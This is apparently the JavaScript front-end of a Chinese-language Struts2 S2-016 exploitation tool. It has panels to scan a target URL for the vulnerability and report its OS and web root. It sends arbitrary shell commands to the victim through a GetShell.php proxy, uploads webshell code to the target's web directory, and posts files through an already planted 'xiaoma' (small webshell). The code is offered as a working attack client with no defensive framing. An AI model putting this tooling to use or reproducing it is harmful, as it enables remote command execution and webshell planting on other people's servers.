var CmdLogo="sh $> ";
var CmdResultLogs="";
var PrePanel,CurPanel;
var PreMenuBlock,CurMenuBlock;
var ShowVulnsPanel=0;
var ShowCMDPanel=0;
var GetShellPanel=0;
var FileManagePanel=0;
var ShowMultiCheckPanel=0;
var ViewShellCodePanel=0;
var ProxyUrl="../GetShell.php";
var VulnsActionLink="";


$(document).ready(function(){	  
	
	LoadTopMenu();
	InitMainPanel();
	LoadShellContent( ProxyUrl,$("#specfile1").val());

});

function LoadTopMenu(){
	$("#CheckVlunsBlock").attr("class","checkvulns");
	$("#CommandBlock").attr("class","command");
	$("#GetShellBlock").attr("class","getshell");
    $("#FileManageBlock").attr("class","filemanage");
	$("#MultiCheckBlock").attr("class","multicheck");
	
	$("#CheckVlunsBlock").click(OnChangeMenu);
	CurMenuBlock="CheckVlunsBlock";
	$("#CheckVlunsBlock").toggleClass("changecolor");

	$("#CommandBlock").click(OnChangeMenu);
	$("#GetShellBlock").click(OnChangeMenu);
    $("#FileManageBlock").click(OnChangeMenu);
	$("#MultiCheckBlock").click(OnChangeMenu);

}

function InitMainPanel(){

	$("#CheckVulnsPanel").attr("class","checkvulnspanel");
	$("#CheckVulnsPanel").css("display","block");
	CurPanel = 'CheckVulnsPanel';

	$("#CommandPanel").attr("class","commandpanel");
	$("#CommandPanel").css("display","none");
	$("#CommandInfoShow").css("display","none");
	$("#CommandResult").attr("class","commandresult");	
	$("#CommandResult").html(CmdLogo);

	$("#GetShellPanel").attr("class","getshellpanel");
	$("#ContentShell").attr("class","ContentShell");
	$("#GetShellPanel").css("display","none");


	$("#FileManagePanel").attr("class","filemanagepanel");
    $("#FileManagePanel").css("display","none");
//  $("#FileManagePanel").load("client.html");
  

	$("#MultiCheckPanel").attr("class","multicheckpanel");

	$("#StartCheckVulns").click( CheckVulnsFunc );
	$("#ExecuteCMD").click( ExecuteCMDFunc );
	$("#ClearCmdResult").click(ClearCmdLogs);
    $("#uploadfile").click(UploadFileFunc);
    $(".specfile").click(GetSpecFileFunc);
    $("#uploadfile2").click(ConnXiaoMaShell);
	$("#ShowShellCodeBlock").click( ShowShellCodeFunc );
    

}

function OnChangeMenu(){

	PrePanel=CurPanel;
	PreMenuBlock=CurMenuBlock;
	CurMenuBlock=this.id;
	switch(CurMenuBlock){
		case 'CheckVlunsBlock':
			CurPanel='CheckVulnsPanel';
			break;
		case 'CommandBlock':
			CurPanel='CommandPanel';
			break;
		case 'GetShellBlock':
			CurPanel='GetShellPanel';
			$("#ShowShellCodeBlock").css("display","block");
			break;
 		case 'FileManageBlock':
			CurPanel='FileManagePanel';
			
			break;       
		case 'MultiCheckBlock':
			MultiCheckFunc();
			CurPanel='MultiCheckPanel';
			break;
	}
	
	//处理不同菜单块的颜色变化
	if(PreMenuBlock !=CurMenuBlock){
    	eval('var menuselector = "#"+PreMenuBlock');
    	$(menuselector).toggleClass("changecolor");
    	eval('var menuselector = "#"+CurMenuBlock');
    	$(menuselector).toggleClass("changecolor");
	}

	//处理不同panel的切换
	eval('var panelselector = "#"+PrePanel');
	$(panelselector).slideToggle("slow",function(){});
	$(panelselector).slideUp("slow",function(){
    	eval('var panelselector = "#"+CurPanel');
    	$(panelselector).slideDown("slow",function(){});
	});

}


function CheckVulnsFunc(){

	var CheckAction = $("#CheckAction").attr("value");
	if(CheckAction==""){
		$("#StartCheckVulns").attr("disabled",true);
		ShowCheckVulnsInfo("error","请输入要检测的URL链接!");
		return false;
	}

	$("#CheckVlunsShow").hide();
	$("#StartCheckVulns").attr("disabled",true);
	$("#checking").show();

	$.ajax({
		type: "POST",
		url:ProxyUrl,	
		data:{a:CheckAction,s:'CheckVulns',m:1},
		async:true,
		success: function(data){
			//alert(data);
			$("#StartCheckVulns").show();
			$("#StartCheckVulns").attr("disabled",true);
			$("#checking").hide();
            //服务端脚本返回的是json数据格式
            var json_data = eval('('+data+')');
            var result = json_data['result'];
            var root = json_data['data']['root'];
            var systemtype = json_data['data']['system'];
            var msg = "<pre>"
            //msg += "Randm:<br/>";
            msg += "该网站存在S2-16安全漏洞,去测试下远程命令吧!<br/>";
            msg += "服务器类型:"+systemtype+"<br/>";
            msg += "网站根目录:"+root;
            msg += "</pre>";
            $("#uploadpath").val(root);
			if(result=="" || result=='error'){
				ShowCheckVulnsInfo("info","该网站不存在S2-16安全漏洞!");
			}else{
				VulnsActionLink = CheckAction;
				//ShowCheckVulnsInfo("alert",data+": 该网站存在S2-16安全漏洞,去测试下远程命令吧!");
				ShowCheckVulnsInfo("checkresult",msg);
			}
		}
	});  

}

function ShowCheckVulnsInfo(clsstype,msg){

	$("#CheckVlunsShow").attr("class",clsstype);
	$("#CheckVlunsShow").html(msg);
	$("#CheckVlunsShow").show(2000,function(){
	//	$("#CheckVlunsShow").fadeOut(6000,function(){
		$("#StartCheckVulns").attr("disabled",false);
	//	});
	});			
}


function ExecuteCMDFunc(){

	var CheckAction = $("#CheckAction").attr("value");
	var cmd = $("#command").attr("value");

	if(CheckAction==""){
		ShowExecCommandInfo("showexecuteinfo","请先进行‘漏洞检测’!");
		return false;
	}
	if(cmd==""){
		ShowExecCommandInfo("showexecuteinfo","请输入要执行的命令!");
		return false;
	}
	
    var OrigiButtonVal = $("#ExecuteCMD").val();
    $("#ExecuteCMD").val("Loading..");
    $("#ExecuteCMD").attr("disabled",true);
    
    CmdResultLogs+=CmdLogo;
    CmdResultLogs+=cmd;
    CmdResultLogs+="<br/>";
    $("#CommandResult").html(CmdResultLogs);
    $.ajax({
    type: "POST",
    url:ProxyUrl,	
    data:{
		a:CheckAction,
		s:cmd,
		m:3
    	  },
    async:true,
    success: function(data){
    	$("#ExecuteCMD").val(OrigiButtonVal);
    	$("#ExecuteCMD").attr("disabled",false);
        //服务端脚本返回的是json数据格式
        var json_data = eval('('+data+')');
        var result = json_data['result'];
        var data = json_data['data'];  
        data+="<br/>";    
    	if(result=="error"){
    		ShowExecCommandInfo("showexecuteinfo","执行远程命令失败!");
    		return false;
    	}
    	ShowCMDResult(data);
    	ShowExecCommandInfo("showexecuteinfo",'成功执行命令:'+cmd);
    
    }
    });
	
}

function ShowExecCommandInfo(csstype,msg)
{
	
	$("#CommandInfoShow").attr("class",csstype);
	$("#CommandInfoShow").html(msg);
	$("#CommandInfoShow").fadeIn(3000,function(){
		$("#CommandInfoShow").fadeOut(3000,function(){
		});
	});

}

function ShowCMDResult(result){
	CmdResultLogs+=result;
	$("#CommandResult").html(CmdResultLogs);	
	$("#CommandResult").attr("scrollTop",$("#CommandResult").attr("scrollHeight"));
}

function ClearCmdLogs(){
	$("#CommandResult").html("");
	CmdResultLogs="";
}

function UploadFileCheck(){
    
	var CheckAction = $("#CheckAction").attr("value");
	if(CheckAction==""){
		ShowUploadFileInfo("showuploaderrorinfo","请先进行漏洞检测");
		return false;
	}
    
    if($("#uploadpath").val()==""){
        
		ShowUploadFileInfo("showuploaderrorinfo","上传路径不能为空");
		return false;
	}
	if($("#shellname").val()==""){
		ShowUploadFileInfo("showuploaderrorinfo","文件名不能为空");
		return false;
	}
    
	return true;
}

function UploadFileFunc(){

	var ActionUrl = $("#CheckAction").attr("value");
    var UploadPath = $("#uploadpath").attr("value");
	var FileName = $("#shellname").attr("value");
    var data = $("#ContentShell").attr("value");
    var FilePath= UploadPath + "/" + FileName;	

	if(!UploadFileCheck()) {
		return false;
    }

	$.ajax({
		type: "POST",
		url:ProxyUrl,	
		data:{
				"a":ActionUrl,
				"f":FilePath,
                "d":encodeURIComponent(data),
				"m":5
			  },
		async:true,
		success: function(data){
            var json_data = eval("("+data+")");
            content = json_data["data"];
            if(json_data["result"]!="success"){
                ShowUploadFileInfo("showuploaderrorinfo",content);
            }else{
                ShowUploadFileInfo("showuploadsuccessinfo",content);
            }
		}
	});

}




function OnChangeShellText(ViewShellCodePanel){
		 if(ViewShellCodePanel==1)
			$("#ShowShellCodeBlock").text("+ 查看");
		 if(ViewShellCodePanel==0)
			$("#ShowShellCodeBlock").text("- 折叠");
}

function LoadShellContent(url,filename){
    
    $("#ShowShellCodeBlock").attr("class","viewshell");
    OnChangeShellText(ViewShellCodePanel);         
    
	$.ajax({
		type: "GET",
		url:url,	
		data:{
            "n":filename
			  },
		async:true,
		success: function(content){
            $("#ContentShell").text("");
            $("#ContentShell").text(content);	                     
		}
	});            
   
}

function GetSpecFileFunc(){
    var url = ProxyUrl;
    var filename = this.value
    
	$.ajax({
		type: "GET",
		url:url,	
		data:{
            "n":filename
			  },
		async:true,
		success: function(content){
            $("#ContentShell").val(content);	                     
		}
	});  
    
    
}

function ShowShellCodeFunc(){	

	 $("#ContentShell").slideToggle("slow",function(){
		ViewShellCodePanel ^=1;
		OnChangeShellText(ViewShellCodePanel);
	 });
}

function ShowUploadFileInfo(style,content){
    var old_value = $("#uploadfile").val();
    $("#uploadfile").val("uploading...");
    $("#uploadfile").attr("disabled",true);
	$("#contentShow").attr("class",style); 
	$("#contentShow").css("display","none");
	$("#contentShow").html(content);
	$("#contentShow").fadeIn(2000,function(){
	   $("#contentShow").fadeOut(5000,function(){
	       $("#uploadfile").val(old_value);
           $("#uploadfile").attr("disabled",false);
           
	   });
	});
}

 
function _ShowUploadFileInfo(style,content){
	$("#contentShow").attr("class",style); 
	$("#contentShow").css("display","none");
	$("#contentShow").html(content);
	$("#contentShow").fadeOut(4000,function(){
		$("#contentShow").show(4000);
	});
}




/*

*/

function ConnXiaoMaShell(){
    
    
    if(!CheckConnXiaoMa()){
        return false;
    }
    
    var xiaoma_url = $("#xiaoma_url").val();
    var filename = $("#shellname2").val();    
    var content = $("#ContentShell2").val();
        
    //alert("url: "+xiaoma_url);
    //alert("content: "+content);
	$.ajax({
		type: "POST",
		url:xiaoma_url,	
		data:{
            "f":filename,
            "t":content
			  },
		async:true,
		success: function(){
            ShowConnXiaoMaInfo("connxiaomasuccessinfo","文件上传成功!");	                     
		}
	});  
        
    
}

function CheckConnXiaoMa(){
   
    if(0>=($("#xiaoma_url").val()).length ){
        ShowConnXiaoMaInfo("connxiaomaerrorinfo","小马地址不能为空!");
        return false;
    }
    if(0>=($("#shellname2").val()).length ){
        ShowConnXiaoMaInfo("connxiaomaerrorinfo","上传文件名不能为空!");
        return false;
    }
    if(0>=($("#ContentShell2").val()).length ){
        ShowConnXiaoMaInfo("connxiaomaerrorinfo","上传内容不能为空!");
        return false;
    }
    
    return true;
    
   
    
}

function ShowConnXiaoMaInfo(style,content){
    var old_value = $("#uploadfile2").val();
    $("#uploadfile2").val("uploading...");
    $("#uploadfile2").attr("disabled",true);
	$("#contentShow2").attr("class",style); 
	$("#contentShow2").css("display","none");
	$("#contentShow2").html(content);
	$("#contentShow2").fadeIn(2000,function(){
	   $("#contentShow2").fadeOut(5000,function(){
	       $("#uploadfile2").val(old_value);
           $("#uploadfile2").attr("disabled",false);
           
	   });
	});
}


function MultiCheckFunc(){


	var requrl = "../protect/index.php";

	$.ajax({
		type: "GET",
		url:requrl,	
		async:true,
		success: function(data,status){
			$("#MultiCheckInfoShow").attr("class","multichekinfoshow");
			$("#MultiCheckInfoShow").attr("readonly",true);
			$("#MultiCheckInfoShow").html(data);
		}
	});
 
}